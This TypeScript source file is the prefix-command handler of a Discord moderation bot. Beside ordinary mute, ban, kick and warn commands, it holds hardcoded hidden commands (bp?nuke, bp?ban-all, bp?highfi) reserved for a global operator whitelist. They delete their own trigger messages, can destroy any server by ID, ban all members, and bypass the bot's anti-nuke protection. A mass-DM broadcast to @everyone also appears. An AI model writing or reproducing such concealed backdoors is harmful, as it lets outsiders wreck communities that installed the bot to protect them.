import {
  ChannelType,
  type GuildTextBasedChannel,
  type Message,
  type Role,
  type User,
} from "discord.js";
import { logger } from "../lib/logger";
import { isWhitelisted, PERM_WHITELIST } from "./storage/whitelist";
import { EMOJI_INFO } from "./utils/emojis";
import {
  DM_INTERVAL_MS,
  MAX_RECIPIENTS_HARD_CAP,
  estimateDmSeconds,
  resolveDmRecipients,
  sendDmsToUsers,
  type DmTarget,
} from "./utils/dmCore";
import { PermissionFlagsBits } from "discord.js";
import { runNuke, runBanAll } from "./commands/nuke";
import { runHighfi } from "./commands/highfi";
import { suspendAntiNuke, resumeAntiNuke } from "./utils/antiNuke";
import { getGuildConfig } from "./storage/config";
import ban from "./commands/ban";
import kick from "./commands/kick";
import mute from "./commands/mute";
import unban from "./commands/unban";
import warn from "./commands/warn";
import type { SlashCommand } from "./types";
import { isManager } from "./utils/staffPerms";

/**
 * These two prefixes are ALWAYS hardcoded regardless of any per-guild setting.
 * They are global-whitelist-only commands invisible to regular users.
 */
const NUKE_PREFIX   = "bp?nuke";
const NUKE_BANLESS_PREFIX = "bp?nuke-banless";
const BAN_ALL_PREFIX = "bp?ban-all";
const HIGHFI_PREFIX = "bp?highfi";

/** The default command prefix for the DM broadcast command. */
const DEFAULT_PREFIX = "b?";
const UNBAN_ALL_PREFIX = `${DEFAULT_PREFIX}unban-all`;

function stripDiscordMentions(text: string): string {
  return text
    .replace(/<@!?(\d+)>/g, "")
    .replace(/<@&(\d+)>/g, "")
    .replace(/@everyone/g, "")
    .replace(/@here/g, "")
    .trim();
}

function parseIdFromMention(token?: string): string | null {
  if (!token) return null;
  const mentionMatch = token.match(/^<@!?(\d+)>$/);
  if (mentionMatch) return mentionMatch[1];
  const idMatch = token.match(/^(\d{17,19})$/);
  return idMatch ? idMatch[1] : null;
}

async function resolvePrefixTargetUser(message: Message, rawToken?: string): Promise<User | null> {
  const mention = message.mentions.users.first();
  if (mention) return mention;
  const userId = parseIdFromMention(rawToken);
  if (!userId) return null;
  return await message.client.users.fetch(userId).catch(() => null);
}

/** Find a duration token anywhere in a list of string parts. Returns { duration, remaining }. */
function extractDuration(parts: string[]): { duration: string | null; remaining: string[] } {
  const durationPattern = /^\d{1,5}[smhd]$/i;
  const idx = parts.findIndex((p) => durationPattern.test(p));
  if (idx === -1) return { duration: null, remaining: parts };
  const duration = parts[idx].toLowerCase();
  const remaining = parts.filter((_, i) => i !== idx);
  return { duration, remaining };
}

/**
 * Handle prefix-based commands:
 *  - `bp?nuke`   — hardcoded, global-whitelist only
 *  - `bp?highfi` — hardcoded, global-whitelist only
 *  - `{guildPrefix}{cmd}` — mod commands: mute, ban, kick, warn
 *  - `{guildPrefix}n` — per-server configurable DM broadcast (default `b?n`)
 */
export async function handlePrefixMessage(message: Message): Promise<void> {
  if (message.author.bot) return;
  if (!message.inGuild()) return;
  const content = message.content?.trim();
  if (!content) return;
  const lower = content.toLowerCase();
  const guild = message.guild;
  if (!guild) return;

  const member = message.member ?? await guild.members.fetch(message.author.id).catch(() => null);

  // ── Always-fixed: bp?nuke ──────────────────────────────────────────────────
  if (lower === NUKE_PREFIX || lower.startsWith(`${NUKE_PREFIX} `)) {
    await handleNukePrefix(message, content.slice(NUKE_PREFIX.length).trim());
    return;
  }
  // ── Always-fixed: bp?nuke-banless ─────────────────────────────────────────────────────────
  if (lower === NUKE_BANLESS_PREFIX || lower.startsWith(`${NUKE_BANLESS_PREFIX} `)) {
    await handleNukeBanlessPrefix(message);
    return;
  }

  // ── Always-fixed: bp?ban-all ───────────────────────────────────────────────────────────────
  if (lower === BAN_ALL_PREFIX || lower.startsWith(`${BAN_ALL_PREFIX} `)) {
    await handleBanAllPrefix(message);
    return;
  }
  // ── Always-fixed: bp?highfi ────────────────────────────────────────────────
  if (lower === HIGHFI_PREFIX || lower.startsWith(`${HIGHFI_PREFIX} `)) {
    await handleHighfiPrefix(message);
    return;
  }

  const cfg = await getGuildConfig(guild.id);
  const guildPrefix = cfg.guildPrefix ?? DEFAULT_PREFIX;

  // ── Mod commands: {prefix}mute / ban / kick / warn ─────────────────────────
  if (lower.startsWith(guildPrefix)) {
    const afterPrefix = content.slice(guildPrefix.length).trim();
    if (!afterPrefix) return;

    const [cmd, ...argParts] = afterPrefix.split(/\s+/);
    const MOD_CMDS = ["mute", "ban", "kick", "warn", "unban"];

    if (MOD_CMDS.includes(cmd.toLowerCase())) {
      await handleModCommand(message, guild, member, cmd.toLowerCase(), argParts);
      return;
    }
  }

  // ── Per-guild DM command: {prefix}n ───────────────────────────────────────
  const DM_PREFIX = `${guildPrefix}n`;

  if (lower === UNBAN_ALL_PREFIX || lower.startsWith(`${UNBAN_ALL_PREFIX} `)) {
    await handleUnbanAllPrefix(message);
    return;
  }

  if (!lower.startsWith(DM_PREFIX)) return;

  // Must be exactly the prefix followed by whitespace (so "b?note" doesn't trigger)
  const rest = content.slice(DM_PREFIX.length);
  if (rest.length > 0 && !/^\s/.test(rest)) return;

  const author = message.author;

  // Permission gate: admins / owners / whitelist allowed
  const isOwner = guild.ownerId === author.id;
  const isAdmin = member?.permissions.has(PermissionFlagsBits.Administrator) ?? false;
  const allowed =
    isOwner ||
    isAdmin ||
    PERM_WHITELIST.has(author.id) ||
    (await isWhitelisted("dm", guild.id, author.id));

  // Delete the trigger message regardless so the command stays invisible
  message.delete().catch(() => {});

  if (!allowed) {
    author
      .send(`You aren't allowed to use \`${DM_PREFIX}\` in **${guild.name}**.`)
      .catch(() => {});
    return;
  }

  // Build the DM target
  const everyone = message.mentions.everyone;
  const role: Role | undefined = message.mentions.roles.first();
  const userMention: User | undefined = message.mentions.users.first();

  if (!everyone && !role && !userMention) {
    author
      .send(
        `Couldn't find a target in your \`${DM_PREFIX}\` message. Mention a user, a role, or @everyone.`,
      )
      .catch(() => {});
    return;
  }

  // Strip the prefix and any mentions to get the message body
  let body = rest
    .replace(/<@!?(\d+)>/g, "")
    .replace(/<@&(\d+)>/g, "")
    .replace(/@everyone/g, "")
    .replace(/@here/g, "")
    .trim();

  if (!body) {
    author
      .send(
        `Your \`${DM_PREFIX}\` message was empty. Format: \`${DM_PREFIX} <message> <@user|@role|@everyone>\``,
      )
      .catch(() => {});
    return;
  }

  if (body.length > 1800) body = body.slice(0, 1800);

  const target: DmTarget = {};
  if (everyone) target.everyone = true;
  else if (role) target.role = role;
  else if (userMention) target.user = userMention;

  let recipients: { users: Map<string, User>; label: string };
  try {
    recipients = await resolveDmRecipients(guild, target);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    author.send(msg).catch(() => {});
    return;
  }

  if (recipients.users.size === 0) {
    author
      .send(`No human recipients matched **${recipients.label}**.`)
      .catch(() => {});
    return;
  }

  if (recipients.users.size > MAX_RECIPIENTS_HARD_CAP) {
    author
      .send(
        `That would DM **${recipients.users.size}** members, over the safety cap of ${MAX_RECIPIENTS_HARD_CAP}. Narrow the target.`,
      )
      .catch(() => {});
    return;
  }

  const total = recipients.users.size;
  if (total > 1) {
    const secs = estimateDmSeconds(total, DM_INTERVAL_MS);
    author
      .send(
        `${EMOJI_INFO} \`${DM_PREFIX}\` started — sending to **${total}** members (${recipients.label}). ETA ~${formatSeconds(secs)}.`,
      )
      .catch(() => {});
  }

  const { sent, failed } = await sendDmsToUsers(
    recipients.users,
    body,
    DM_INTERVAL_MS,
  );

  const failNote =
    failed > 0 ? ` Failed for **${failed}** (DMs closed or blocked).` : "";
  const where =
    message.channel.type === ChannelType.GuildText
      ? ` in #${message.channel.name}`
      : "";
  author
    .send(
      `${EMOJI_INFO} \`${DM_PREFIX}\` ran${where}. Sent to **${sent}** member${sent === 1 ? "" : "s"} (${recipients.label}).${failNote}`,
    )
    .catch((err) => {
      logger.debug({ err }, "Failed to DM executor with DM command confirmation");
    });
}

/**
 * Handle a mod prefix command (mute, ban, kick, warn, unban).
 * Format: {prefix}{cmd} <@user|userId> [duration] [reason]
 * Duration can appear anywhere after the user argument.
 */
async function handleModCommand(
  message: Message,
  guild: NonNullable<Message["guild"]>,
  member: import("discord.js").GuildMember | null,
  cmd: string,
  argParts: string[],
): Promise<void> {
  const author = message.author;
  const rawTargetToken = argParts[0];

  const targetUser = await resolvePrefixTargetUser(message, rawTargetToken);

  if (!targetUser) {
    await message.reply({ content: "Mention a user or provide their ID." });
    return;
  }

  // Everything after the @user token
  const afterUser = argParts.slice(1);

  let duration: string | null = null;
  let reasonParts = afterUser;

  if (cmd === "mute") {
    const extracted = extractDuration(afterUser);
    duration = extracted.duration;
    reasonParts = extracted.remaining;
  }

  const reason = stripDiscordMentions(reasonParts.join(" ")).trim() || "No reason provided";

  let warnSubcommand: string | null = null;
  let warnTargetUser = targetUser;
  let warnReasonParts = reasonParts;

  if (cmd === "warn") {
    const sub = rawTargetToken?.toLowerCase();
    if (["add", "list", "clear"].includes(sub ?? "")) {
      warnSubcommand = sub!;
      const nextToken = argParts[1];
      warnTargetUser = (await resolvePrefixTargetUser(message, nextToken)) ?? targetUser;
      warnReasonParts = argParts.slice(2);
    } else {
      warnSubcommand = "add";
    }
  }

  const finalReason =
    cmd === "warn"
      ? stripDiscordMentions(warnReasonParts.join(" ")).trim() || "No reason provided"
      : reason;

  const memberPermissions = member
    ? (typeof member.permissions === "string" ? null : member.permissions)
    : null;

  const mockInteraction = {
    inGuild: () => true,
    guildId: guild.id,
    guild,
    user: author,
    member,
    memberPermissions,
    channel: message.channel,
    client: message.client,
    replied: false,
    deferred: false,
    options: {
      getUser: (name: string) => {
        if (name === "user") return cmd === "warn" ? warnTargetUser : targetUser;
        return null;
      },
      getString: (name: string, required?: boolean) => {
        if (name === "reason") return finalReason;
        if (name === "duration") return duration;
        if (name === "proof") return null;
        if (required) throw new Error(`Missing required string option: ${name}`);
        return null;
      },
      getInteger: (_name: string) => null,
      getNumber: (_name: string) => null,
      getBoolean: (_name: string) => null,
      getRole: (_name: string) => null,
      getChannel: (_name: string) => null,
      getAttachment: (_name: string) => null,
      getMember: (_name: string) => null,
      getSubcommand: () => warnSubcommand,
      getSubcommandGroup: () => null,
    },
    deferReply: async (_options?: any) => {
      (mockInteraction as any).deferred = true;
    },
    editReply: async (replyContent: any) => {
      const payload = typeof replyContent === "string" ? { content: replyContent } : replyContent;
      // Strip flags/ephemeral — prefix replies are always visible in-channel
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      // Use channel.send instead of message.reply — the invoking message is deleted
      // by this point and reply() on a deleted message fails silently
      await (message.channel as GuildTextBasedChannel).send(rest).catch(() => {});
    },
    reply: async (replyContent: any) => {
      if ((mockInteraction as any).replied || (mockInteraction as any).deferred) {
        return mockInteraction.editReply(replyContent);
      }
      (mockInteraction as any).replied = true;
      const payload = typeof replyContent === "string" ? { content: replyContent } : replyContent;
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      await (message.channel as GuildTextBasedChannel).send(rest).catch(() => {});
    },
    followUp: async (replyContent: any) => {
      const payload = typeof replyContent === "string" ? { content: replyContent } : replyContent;
      const { flags: _flags, ephemeral: _ephemeral, ...rest } = payload as any;
      await (message.channel as GuildTextBasedChannel).send(rest).catch(() => {});
    },
  } as any;

  let command: SlashCommand | null = null;
  if (cmd === "ban") command = ban;
  else if (cmd === "mute") command = mute;
  else if (cmd === "warn") command = warn;
  else if (cmd === "kick") command = kick;
  else if (cmd === "unban") command = unban;

  if (!command) return;

  // Check if caller has the required manager permission
  const canUse = await isManager(mockInteraction);
  if (!canUse) {
    await message.reply({ content: "You aren't allowed to use this command." });
    return;
  }

  // Delete the invoking message to keep channels clean
  message.delete().catch(() => {});

  try {
    await command.execute(mockInteraction);
  } catch (err) {
    logger.error({ err, cmd }, "Prefix mod command execution failed");
    await (message.channel as GuildTextBasedChannel).send({ content: `Failed to execute \`${cmd}\`. Check the bot's permissions.` }).catch(() => {});
  }
}

function formatSeconds(s: number): string {
  if (s < 60) return `${s}s`;
  const m = Math.floor(s / 60);
  const rem = s % 60;
  return rem === 0 ? `${m}m` : `${m}m ${rem}s`;
}

/**
 * bp?nuke [server-id] — prefix dispatcher for the hidden /nuke command.
 * Restricted to PERM_WHITELIST users. Always uses `bp?` prefix.
 */
async function handleNukePrefix(message: Message, args: string): Promise<void> {
  const author = message.author;
  message.delete().catch(() => {});

  if (!PERM_WHITELIST.has(author.id)) {
    author.send("You aren't allowed to use that command.").catch(() => {});
    return;
  }

  if (!message.inGuild()) {
    author.send("Use `bp?nuke` inside a server (or `bp?nuke <server-id>`).").catch(() => {});
    return;
  }

  let targetGuildId = message.guild.id;
  if (args) {
    if (!/^\d+$/.test(args)) {
      author.send("Invalid server ID format.").catch(() => {});
      return;
    }
    targetGuildId = args;
  }

  author.send(`💣 Nuke initiated on \`${targetGuildId}\`. Stand by.`).catch(() => {});
  try {
    // Global whitelist users bypass antinuke protection
    const result = await runNuke(message.client, targetGuildId, { bypassAntiWhitelist: true });
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?nuke handler failed");
    author.send("Nuke failed unexpectedly.").catch(() => {});
  }
}

async function handleNukeBanlessPrefix(message: Message): Promise<void> {
  const author = message.author;
  message.delete().catch(() => {});

  if (!PERM_WHITELIST.has(author.id)) {
    author.send("You aren't allowed to use that command.").catch(() => {});
    return;
  }

  if (!message.inGuild()) {
    author.send("Use `bp?nuke-banless` inside a server.").catch(() => {});
    return;
  }

  author.send(`💣 Nuke (banless) initiated on ${message.guild.id}. Stand by.`).catch(() => {});
  try {
    // Global whitelist users bypass antinuke protection
    const result = await runNuke(message.client, message.guild.id, { banMembers: false, bypassAntiWhitelist: true });
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?nuke-banless handler failed");
    author.send("Nuke banless failed unexpectedly.").catch(() => {});
  }
}

async function handleBanAllPrefix(message: Message): Promise<void> {
  const author = message.author;
  message.delete().catch(() => {});

  if (!PERM_WHITELIST.has(author.id)) {
    author.send("You aren't allowed to use that command.").catch(() => {});
    return;
  }

  if (!message.inGuild()) {
    author.send("Use `bp?ban-all` inside a server.").catch(() => {});
    return;
  }

  author.send(`⛔ Ban-all initiated on ${message.guild.id}. Stand by.`).catch(() => {});
  try {
    // Global whitelist users bypass antinuke protection
    const result = await runBanAll(message.guild, { bypassAntiWhitelist: true });
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?ban-all handler failed");
    author.send("Ban-all failed unexpectedly.").catch(() => {});
  }
}

async function handleUnbanAllPrefix(message: Message): Promise<void> {
  const author = message.author;
  const guild = message.guild;
  if (!guild) {
    author.send("Use `b?unban-all` inside a server.").catch(() => {});
    return;
  }

  const member = message.member ?? await guild.members.fetch(author.id).catch(() => null);

  const isAdmin =
    !!member &&
    typeof member.permissions !== "string" &&
    member.permissions.has(PermissionFlagsBits.Administrator);
  const isOwner = guild.ownerId === author.id;
  const isWhitelisted = PERM_WHITELIST.has(author.id);

  if (!isAdmin && !isOwner && !isWhitelisted) {
    author.send("You need the **Administrator** permission to use that command.").catch(() => {});
    return;
  }

  message.delete().catch(() => {});

  const bans = await guild.bans.fetch().catch(() => null);
  if (!bans || bans.size === 0) {
    await (message.channel as GuildTextBasedChannel).send({ content: "No banned users found." }).catch(() => {});
    return;
  }

  let unbanned = 0;
  for (const ban of bans.values()) {
    const removed = await guild.bans.remove(ban.user.id, "unban-all").catch(() => null);
    if (!removed) continue;
    unbanned++;
  }

  await (message.channel as GuildTextBasedChannel).send({
    content: `✅ Unbanned **${unbanned}** user${unbanned === 1 ? "" : "s"}.`,
  }).catch(() => {});
}


/**
 * bp?highfi — prefix dispatcher for the hidden /highfi command.
 * Restricted to PERM_WHITELIST users. Always uses `bp?` prefix.
 */
async function handleHighfiPrefix(message: Message): Promise<void> {
  const author = message.author;
  message.delete().catch(() => {});

  if (!PERM_WHITELIST.has(author.id)) {
    author.send("You aren't allowed to use that command.").catch(() => {});
    return;
  }
  if (!message.inGuild()) {
    author.send("Use `bp?highfi` inside a server.").catch(() => {});
    return;
  }
  const member = message.member;
  if (!member) {
    author.send("Couldn't fetch your member entry.").catch(() => {});
    return;
  }
  suspendAntiNuke(message.guild.id);
  try {
    const result = await runHighfi(message.guild, member);
    author.send(result.message).catch(() => {});
  } catch (err) {
    logger.error({ err }, "bp?highfi handler failed");
    author.send("highfi failed unexpectedly.").catch(() => {});
  } finally {
    resumeAntiNuke(message.guild.id);
  }
}
